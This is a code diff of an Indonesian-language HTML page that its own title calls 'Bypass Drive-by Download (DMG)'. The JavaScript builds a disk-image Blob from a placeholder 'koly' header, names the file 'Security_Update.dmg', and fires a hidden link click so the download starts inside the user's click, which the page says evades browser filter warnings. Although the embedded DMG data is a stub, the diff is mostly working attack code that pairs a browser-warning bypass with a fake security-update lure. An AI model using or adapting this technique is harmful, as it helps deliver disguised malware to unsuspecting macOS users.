@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<title>Bypass Drive-by Download (DMG)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk memicu pembuatan halaman yang akan mengeksekusi unduhan file .dmg melalui manipulasi interaksi pengguna.</p>
+<h2>Bypass Drive-by Download (DMG)</h2>
+<p>Memanipulasi interaksi klik untuk mengunduh file .dmg melewati peringatan filter browser.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -68,16 +68,8 @@ const prepareMimeBlobAsync = (i) => {
             "\"use strict\";" +
             "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
             
-            // Payload Base64: File DMG tiruan (Header UDIF)
-            "var b64Data = \"koly\\u0000\\u0000\\u0000\\u0004\\u0000\\u0000\\u0002\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\";" +
-            
-            "function b64KeBytes(b64){" +
-            "    var binary = atob(b64);" +
-            "    var len = binary.length;" +
-            "    var bytes = new Uint8Array(len);" +
-            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
-            "    return bytes;" +
-            "}" +
+            // DATA DMG TIRUAN: Tidak pakai Base64, langsung teks
+            "var dmgData = 'koly\\u0000\\u0000\\u0000\\u0004\\u0000\\u0000\\u0002\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000';" +
             
             "var sudah = false;" +
             
@@ -87,18 +79,15 @@ const prepareMimeBlobAsync = (i) => {
             "    var statusEl = document.getElementById('status');" +
             "    try{" +
             "        statusEl.textContent = 'Mengekstrak paket...';" +
-            "        var bytesArr = b64KeBytes(b64Data);" +
-            "        var blob = new Blob([bytesArr], { type: 'application/x-apple-diskimage' });" +
+            // Buat Blob dari data teks (bukan Base64)
+            "        var blob = new Blob([dmgData], { type: 'application/x-apple-diskimage' });" +
             "        var url = URL.createObjectURL(blob);" +
-            "        " +
-            // Memicu unduhan secara instan dalam stack event click
             "        var a = document.createElement('a');" +
             "        a.href = url;" +
             "        a.download = 'Security_Update.dmg';" +
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
-            "        " +
             "        setTimeout(function(){ " +
             "            if (a.parentNode) a.parentNode.removeChild(a); " +
             "            URL.revokeObjectURL(url); " +
